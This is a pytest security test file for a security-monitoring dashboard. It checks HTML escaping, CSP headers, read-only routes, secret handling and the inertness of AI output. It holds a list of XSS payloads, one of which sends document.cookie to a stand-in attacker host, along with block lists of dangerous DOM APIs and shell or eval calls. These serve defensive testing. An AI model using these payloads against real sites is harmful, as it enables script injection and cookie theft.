"""Security tests for the dashboard (Phase 6).

The dashboard renders data written by whoever was on the monitored host: log
messages, usernames, command lines, file names -- and AI prose derived from
them.  All of it is hostile input.  These tests assert the properties that keep
it inert:

* every telemetry field is escaped before it reaches the DOM;
* no JavaScript in this project builds HTML from data;
* the API is read-only and has no route that changes anything;
* nothing about the AI layer becomes executable by being displayed;
* no secret is exposed through any endpoint or page.
"""

import json
import pathlib
import re
from html.parser import HTMLParser

import pytest

from conftest import make_alert, make_event, network_event, process_event
from sentinelforge.correlation.engine import CorrelationEngine
from sentinelforge.dashboard.app import CONTENT_SECURITY_POLICY, create_app
from sentinelforge.dashboard.state import DashboardConfig, DashboardContext
from sentinelforge.models.event import EventType, Severity
from sentinelforge.storage.sqlite import IncidentStore

#: Payloads an attacker can realistically get into a log line, a username or a
#: command line on a Linux host.
XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert('xss')>",
    "<svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "</title><script>fetch('http://evil.example/'+document.cookie)</script>",
    "<iframe src=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert(1)>",
    "{{7*7}}",  # template injection through a rendered value
    "${7*7}",
]

PACKAGE_DIR = pathlib.Path(__file__).resolve().parents[1] / "src" / "sentinelforge" / "dashboard"


class _TagAudit(HTMLParser):
    """Collects the tags and event-handler attributes a browser would act on.

    Checking the parsed DOM rather than the raw text is the honest test: the
    page legitimately contains its own ``<script src=...>``, and a payload that
    stays inside a quoted attribute value is inert even though its characters
    appear in the response body.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.scripts: list[dict] = []
        self.injected_tags: list[str] = []
        self.handler_attributes: list[tuple[str, str]] = []
        self.javascript_urls: list[tuple[str, str]] = []

    def handle_starttag(self, tag, attrs):
        attributes = {name: (value or "") for name, value in attrs}
        if tag == "script":
            self.scripts.append(attributes)
        if tag in ("img", "svg", "iframe", "object", "embed"):
            self.injected_tags.append(tag)
        if tag == "form":
            # A GET filter form aimed at this app is expected; anything else
            # would be a state-changing surface the dashboard must not have.
            method = attributes.get("method", "get").lower()
            action = attributes.get("action", "")
            if method != "get" or not action.startswith("/"):
                self.injected_tags.append("form")
        for name, value in attributes.items():
            if name.startswith("on"):
                self.handler_attributes.append((tag, name))
            if name in ("href", "src", "action") and value.strip().lower().startswith("javascript:"):
                self.javascript_urls.append((tag, value))


def audit_html(body: str) -> _TagAudit:
    parser = _TagAudit()
    parser.feed(body)
    return parser


def assert_no_injection(body: str) -> None:
    """The page contains only its own script tags and no active markup."""
    audit = audit_html(body)
    for script in audit.scripts:
        source = script.get("src", "")
        assert source.startswith("/static/"), f"unexpected script tag: {script}"
    assert audit.injected_tags == [], f"injected tags rendered: {audit.injected_tags}"
    assert audit.handler_attributes == [], f"event handlers rendered: {audit.handler_attributes}"
    assert audit.javascript_urls == [], f"javascript: URLs rendered: {audit.javascript_urls}"



@pytest.fixture
def hostile_db(tmp_path):
    """An incident whose every telemetry field carries an XSS payload."""
    payload = XSS_PAYLOADS[0]
    event = make_event(
        0,
        event_type=EventType.AUTHENTICATION_FAILURE,
        severity=Severity.MEDIUM,
        host=f"host{payload}",
        user=f"user{payload}",
        src_ip="192.168.1.50",
        process=f"proc{payload}",
        message=f"Failed password for {payload} from 192.168.1.50",
    )
    process = process_event(
        60,
        process=f"bash{payload}",
        parent=f"curl{payload}",
        command_line=f"bash -c '{payload}'",
    )
    connection = network_event(90, process=f"bash{payload}")
    alerts = [
        make_alert(
            "SSH_BRUTE_FORCE", 0, "ALT-000001",
            host=f"host{payload}", user=f"user{payload}",
            description=f"Brute force from {payload}", evidence=[event],
        ),
        make_alert(
            "SUSPICIOUS_PROCESS_EXECUTION", 60, "ALT-000002",
            host=f"host{payload}", evidence=[process],
        ),
        make_alert(
            "SUSPICIOUS_NETWORK_CONNECTION", 90, "ALT-000003",
            host=f"host{payload}", evidence=[connection],
        ),
    ]
    incident = CorrelationEngine().run(alerts)[0]
    incident.title = f"Incident {payload}"
    # AI output is derived from the same hostile text, so it is hostile too.
    incident.ai_analysis = {
        "incident_id": incident.incident_id,
        "status": "ok",
        "assessment": "likely_malicious",
        "confidence": 0.9,
        "summary": f"Summary containing {payload}",
        "severity_assessment": "critical",
        "attack_stage": "post_compromise",
        "key_evidence": [{"observation": payload, "significance": payload}],
        "false_positive_indicators": [payload],
        "investigation_steps": [payload],
        "recommended_actions": [{"action": payload, "priority": "high", "reason": payload}],
        "mitre_analysis": [{"technique_id": "T1110", "technique": payload,
                            "relevance": "observed", "rationale": payload}],
        "reasoning": payload,
        "audit": {"provider": "mock", "model": payload, "is_mock": True,
                  "prompt_version": "1.0", "schema_version": "1.0"},
    }

    path = str(tmp_path / "hostile.db")
    with IncidentStore(path) as store:
        store.save(incident)
    return path


@pytest.fixture
def hostile_client(hostile_db, dashboard_bus):
    context = DashboardContext(DashboardConfig(db_path=hostile_db), bus=dashboard_bus)
    app = create_app(context=context, start_monitors=False)
    yield app.test_client()
    context.stop()


class TestHtmlEscaping:
    @pytest.mark.parametrize("path", ["/", "/alerts", "/incidents", "/incidents/INC-000001", "/mitre"])
    def test_no_page_emits_an_executable_script_tag(self, hostile_client, path):
        assert_no_injection(hostile_client.get(path).get_data(as_text=True))

    def test_payloads_are_present_but_escaped(self, hostile_client):
        """The analyst must still see the hostile string -- as text."""
        body = hostile_client.get("/incidents/INC-000001").get_data(as_text=True)
        assert "&lt;script&gt;alert(&#34;xss&#34;)&lt;/script&gt;" in body
        assert "<script>alert" not in body

    def test_every_telemetry_surface_is_escaped(self, hostile_client):
        body = hostile_client.get("/incidents/INC-000001").get_data(as_text=True)
        # Each of these sections renders a different hostile field.
        for marker in ("Process tree", "Network telemetry", "Timeline", "AI SOC analyst", "Alerts and evidence"):
            assert marker in body
        # No active markup anywhere on the fully-populated page.
        assert_no_injection(body)

    def test_command_lines_are_escaped_and_never_executed(self, hostile_client):
        body = hostile_client.get("/incidents/INC-000001").get_data(as_text=True)
        assert "bash -c &#39;&lt;script&gt;" in body

    def test_ai_generated_text_is_escaped(self, hostile_client):
        body = hostile_client.get("/incidents/INC-000001").get_data(as_text=True)
        assert "Summary containing &lt;script&gt;" in body

    def test_template_expressions_in_data_are_not_evaluated(self, tmp_path, dashboard_bus):
        incident = CorrelationEngine().run(
            [make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001", description="{{7*7}} ${7*7}")]
        )[0]
        path = str(tmp_path / "tmpl.db")
        with IncidentStore(path) as store:
            store.save(incident)
        context = DashboardContext(DashboardConfig(db_path=path), bus=dashboard_bus)
        app = create_app(context=context, start_monitors=False)
        try:
            body = app.test_client().get("/incidents/INC-000001").get_data(as_text=True)
            assert "{{7*7}}" in body
            assert "49" not in body.split("Alerts and evidence")[0].replace("INC-000001", "")
        finally:
            context.stop()

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_payloads_in_a_query_string_are_escaped(self, hostile_client, payload):
        """A payload echoed back into a filter box must stay inside its attribute."""
        body = hostile_client.get("/incidents", query_string={"q": payload}).get_data(as_text=True)
        assert_no_injection(body)

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_payloads_in_telemetry_are_escaped(self, tmp_path, dashboard_bus, payload):
        """The same check with the payload coming from a log line, not a URL."""
        event = make_event(0, user=payload, message=f"Failed password for {payload}")
        alerts = [
            make_alert(
                "SSH_BRUTE_FORCE", 0, "ALT-000001",
                description=payload, user=payload, evidence=[event],
            )
        ]
        incident = CorrelationEngine().run(alerts)[0]
        incident.title = payload
        path = str(tmp_path / "payload.db")
        with IncidentStore(path) as store:
            store.save(incident)
        context = DashboardContext(DashboardConfig(db_path=path), bus=dashboard_bus)
        app = create_app(context=context, start_monitors=False)
        try:
            client = app.test_client()
            for route in ("/", "/alerts", "/incidents", "/incidents/INC-000001"):
                assert_no_injection(client.get(route).get_data(as_text=True))
        finally:
            context.stop()


class TestApiDoesNotRenderHtml:
    def test_api_returns_json_not_html(self, hostile_client):
        response = hostile_client.get("/api/incidents/INC-000001")
        assert response.mimetype == "application/json"
        # JSON carries the payload verbatim; the browser never parses it as HTML.
        assert "<script>" in json.dumps(response.json)

    def test_json_content_type_prevents_sniffing(self, hostile_client):
        response = hostile_client.get("/api/incidents")
        assert response.headers["X-Content-Type-Options"] == "nosniff"


class TestSecurityHeaders:
    def test_csp_forbids_inline_script(self, client):
        policy = client.get("/").headers["Content-Security-Policy"]
        assert policy == CONTENT_SECURITY_POLICY
        assert "'unsafe-inline'" not in policy
        assert "'unsafe-eval'" not in policy
        assert "script-src 'self'" in policy
        assert "object-src 'none'" in policy
        assert "frame-ancestors 'none'" in policy

    def test_other_hardening_headers(self, client):
        headers = client.get("/").headers
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["Referrer-Policy"] == "no-referrer"

    def test_no_inline_script_or_handler_in_any_template(self):
        """The CSP only holds if the templates actually comply with it."""
        for template in (PACKAGE_DIR / "templates").glob("*.html"):
            body = template.read_text()
            assert "<script>" not in body, template.name
            assert not re.search(r"\son(click|load|error|mouseover)\s*=", body), template.name
            for tag in re.findall(r"<script[^>]*>", body):
                assert "src=" in tag, f"{template.name}: inline script"


class TestNoUnsafeDomApis:
    def scripts(self):
        return list((PACKAGE_DIR / "static" / "js").glob("*.js"))

    @staticmethod
    def strip_comments(source: str) -> str:
        source = re.sub(r"/\*.*?\*/", "", source, flags=re.DOTALL)
        return re.sub(r"^\s*//.*$", "", source, flags=re.MULTILINE)

    def test_javascript_never_builds_html_from_data(self):
        """textContent only: the single rule that makes the frontend XSS-proof."""
        assert self.scripts(), "no dashboard JavaScript found"
        for script in self.scripts():
            code = self.strip_comments(script.read_text())
            for forbidden in ("innerHTML", "outerHTML", "insertAdjacentHTML",
                              "document.write", "eval(", "new Function", "setTimeout(\""):
                assert forbidden not in code, f"{script.name} uses {forbidden}"

    def test_javascript_uses_textcontent(self):
        combined = "".join(script.read_text() for script in self.scripts())
        assert "textContent" in combined


class TestReadOnlyBoundary:
    def test_state_changing_routes_exist_only_under_the_response_api(self, dashboard_app):
        """Everything except containment is still strictly read-only."""
        for rule in dashboard_app.url_map.iter_rules():
            if {"POST", "PUT", "PATCH", "DELETE"} & rule.methods:
                assert rule.rule.startswith("/api/response/"), rule.rule

    def test_the_dashboard_package_cannot_execute_anything(self):
        """No shell, no subprocess, no eval anywhere in the dashboard package."""
        import ast

        forbidden_imports = {"subprocess", "pty", "ctypes", "shutil", "pickle"}
        forbidden_calls = {"eval", "exec", "compile", "__import__"}
        forbidden_dotted = {"os.system", "os.popen", "os.remove", "os.unlink", "os.rmdir",
                            "subprocess.run", "subprocess.Popen", "shutil.rmtree"}

        for path in PACKAGE_DIR.rglob("*.py"):
            tree = ast.parse(path.read_text())
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    names = {alias.name.split(".")[0] for alias in node.names}
                    assert not (names & forbidden_imports), f"{path.name} imports {names}"
                elif isinstance(node, ast.ImportFrom) and node.module:
                    assert node.module.split(".")[0] not in forbidden_imports, path.name
                elif isinstance(node, ast.Call):
                    name = _call_name(node.func)
                    if path.name == "demo.py" and name == "os.remove":
                        continue  # documented: resets its own demo database only
                    assert name not in forbidden_calls, f"{path.name}:{node.lineno} {name}()"
                    assert name not in forbidden_dotted, f"{path.name}:{node.lineno} {name}()"

    def test_the_dashboard_never_writes_to_the_incident_store(self):
        """Rendering an incident must not be able to change one."""
        for path in PACKAGE_DIR.rglob("*.py"):
            if path.name == "demo.py":
                continue  # demo.py builds its own separate database, by design
            source = path.read_text()
            for writer in (".save(", ".save_all(", ".delete(", ".update_status("):
                assert writer not in source, f"{path.name} writes to the store"

    def test_debug_mode_is_never_the_default(self):
        assert DashboardConfig().debug is False

    def test_default_bind_is_loopback(self):
        config = DashboardConfig()
        assert config.host == "127.0.0.1"
        assert config.is_loopback


class TestNoSecretExposure:
    def test_no_endpoint_returns_an_api_key(self, hostile_client, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-super-secret-value")
        monkeypatch.setenv("SENTINELFORGE_LLM_API_KEY", "sk-another-secret")
        for path in ("/api/health", "/api/sensors", "/api/stats", "/api/incidents",
                     "/api/incidents/INC-000001", "/api/incidents/INC-000001/ai",
                     "/", "/sensors", "/incidents/INC-000001"):
            body = hostile_client.get(path).get_data(as_text=True)
            assert "sk-super-secret-value" not in body, path
            assert "sk-another-secret" not in body, path

    def test_sensor_page_reports_key_presence_only(self, client, monkeypatch):
        monkeypatch.setenv("SENTINELFORGE_LLM_PROVIDER", "openai")
        monkeypatch.setenv("SENTINELFORGE_LLM_API_KEY", "sk-not-printable")
        body = client.get("/api/sensors").get_data(as_text=True)
        assert "sk-not-printable" not in body
        assert "ai-analyst" in body


class TestAiOutputIsInert:
    def test_recommended_actions_are_displayed_as_text(self, hostile_client):
        body = hostile_client.get("/incidents/INC-000001").get_data(as_text=True)
        assert "not executed" in body  # the UI says so explicitly
        assert "<script>alert" not in body

    def test_no_route_takes_an_action_name_from_ai_output(self, dashboard_app):
        """Phase 7 added containment routes, and none of them is AI-reachable.

        The routes that change the system take an ``action_type`` from a closed
        vocabulary and an ``action_id`` SentinelForge generated -- never a name,
        a command or a phrase.  So an AI recommendation such as "run
        /usr/bin/curl ..." has no route that would accept it, whatever it says.
        """
        rules = [rule.rule for rule in dashboard_app.url_map.iter_rules()]
        for suspicious in ("/run", "/respond", "/isolate", "/block", "/kill", "/command"):
            assert not any(suspicious in rule for rule in rules), suspicious
        writable = [
            rule
            for rule in dashboard_app.url_map.iter_rules()
            if {"POST", "PUT", "PATCH", "DELETE"} & rule.methods
        ]
        for rule in writable:
            # Every variable segment is an action id, nothing else.
            assert set(rule.arguments) <= {"action_id"}, rule.rule


def _call_name(func) -> str:
    import ast

    parts = []
    node = func
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))
